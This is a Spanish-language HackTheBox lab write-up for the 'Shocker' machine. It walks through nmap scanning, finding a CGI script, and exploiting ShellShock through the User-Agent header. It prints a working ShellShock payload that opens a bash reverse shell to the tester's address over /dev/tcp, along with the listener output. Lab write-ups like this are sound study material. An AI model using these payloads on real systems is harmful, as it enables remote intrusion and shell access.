---
title: Shocker | Linux
published: 2025-03-26
image: "./logo.png"
tags: [Easy, Linux, ShellShock Attack, Abusing Sudoers, Perl, eJTP, eWPT]
category: HackTheBox
---

## Información Básica

### Técnicas vistas

- ShellShock Attack (User-Agent)
- Abusing Sudoers Privilege (Perl)

### Preparación

- eWPT
- eJPT

***

## Reconocimiento

Para comenzar el reconocimiento de esta máquina usaremos el comando **scan**:

```sh
scan () {
	sudo nmap -sS --min-rate=5000 -p- --open -vvv -n -Pn "$1" -oG "nmap/AllPorts"
}
```

Esto nos exportará los puertos que estén abiertos para que posteriormente ver las versiones que corren en cada puerto.

```
# Nmap 7.95 scan initiated Fri Mar 21 16:17:28 2025 as: /usr/lib/nmap/nmap -sS --min-rate=5000 -p- --open -vvv -n -Pn -oG nmap/AllPorts 10.10.10.56
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.56 ()    Status: Up
Host: 10.10.10.56 ()    Ports: 80/open/tcp//http///, 2222/open/tcp//EtherNetIP-1///
# Nmap done at Fri Mar 21 16:17:47 2025 -- 1 IP address (1 host up) scanned in 19.21 seconds
```

Una vez escaneados los puertos **88** y **2222** veremos lo siguiente:

```
# Nmap 7.95 scan initiated Sun Mar 23 21:58:37 2025 as: /usr/lib/nmap/nmap -p 2222,80 -sVC -oN nmap/Scan 10.10.10.56
Nmap scan report for 10.10.10.56
Host is up (0.039s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Mar 23 21:58:45 2025 -- 1 IP address (1 host up) scanned in 8.42 seconds
```

### Web

Hay un servidor web **Apache** y otro **SSH**, empezaremos por el primero, vamos a ver que hay en la web:

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FOcclj7Af3GV6muW1w1Bt%2F1.png?alt=media&#x26;token=c76f433d-93da-411d-ad92-a13475608340" alt=""><figcaption></figcaption></figure>

Solo podemos ver esto, y el código fuente tampoco es que sea muy complejo:

```html
<html>
  <head></head>
  <body>
  <h2>Don't Bug Me!</h2>
  <img src="bug.jpg" alt="bug" style="width:450px;height:350px;">
 </body>
</html>
```

### Dirbuster

Por lo que usaremos **dirbuster** para ver directorios o archivos ocultos en el servidor.

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FrI8CAzl1vcLFICTNRJ9J%2F2.png?alt=media&#x26;token=b37966ac-4e38-490d-9c2c-1407887a39e7" alt=""><figcaption></figcaption></figure>

Vemos que hay una ruta llamada `/cgi-bin/` con un archivo `user.sh`. Vamos a buscar información para explotar esto.

## Explotación

Según el artículo: [https://deephacking.tech/shellshock-attack-web/](https://deephacking.tech/shellshock-attack-web/), la vulnerabilidad shellsock viene dada a algunas versiones antiguas de bash en las que al asignar una función como variable de entorno se ejecutaba.&#x20;

Hasta aquí no parece tan grave, el problema viene cuando podemos lograr un `RCE` (Remote Command Execution) . La información recibida por parte del cliente como el `User-Agent`, se guarda como variable de entorno. Esto es grave ya que puede ser manipulada por nosotros para explotarlo de la siguiente manera:

```http
http http://10.10.10.56/cgi-bin/user.sh User-Agent:"() { :;}; echo; echo ¿Es vulnerable?"
HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Type: text/x-sh
Date: Wed, 26 Mar 2025 20:29:16 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.18 (Ubuntu)
Transfer-Encoding: chunked

¿Es vulnerable?

Content-Type: text/plain

Just an uptime test script

 16:29:16 up 21:50,  0 users,  load average: 0.00, 0.00, 0.00
```

> _`http` es una herramienta que he encontrado debido a que curl me estaba dando problemas con el User-Agent. Tiene la misma funcionalidad que curl._

Podemos ver que es vulnerable, por lo que podemos intentar establecer una reverse shell de la siguiente manera:

```bash
http http://10.10.10.56/cgi-bin/user.sh User-Agent:"() { :;}; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.17/8888 0>&1'"
```

```sh
❯ nc -nlvp 8888
listening on [any] 8888 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.56] 51862
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ ls
ls
user.sh
shelly@Shocker:/usr/lib/cgi-bin$
```

De esta manera ya podremos sacar la `user flag`:

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2F1RDGrWlHbcG4focLXIp8%2Fimage.png?alt=media&#x26;token=76c1399d-ab61-4814-b40e-e0e7ff495ad6" alt=""><figcaption></figcaption></figure>

## Escalada de privilegios

Para la escalada de privilegios usaremos:

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2Fefkt6gKOgecOTxxgmulC%2Fimage.png?alt=media&#x26;token=4fd0f181-4446-4e8d-ad47-9f3c16599780" alt=""><figcaption></figcaption></figure>

<figure><img src="https://888882784-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FiJu2WVQWC7LGLmZKHUNM%2Fuploads%2FqdnacIa43jAvI6We8OEP%2Fimage.png?alt=media&#x26;token=dc182071-3121-4a35-a33e-11004c2fbec3" alt=""><figcaption></figcaption></figure>

[Pwned!](https://labs.hackthebox.com/achievement/machine/1992274/108)

---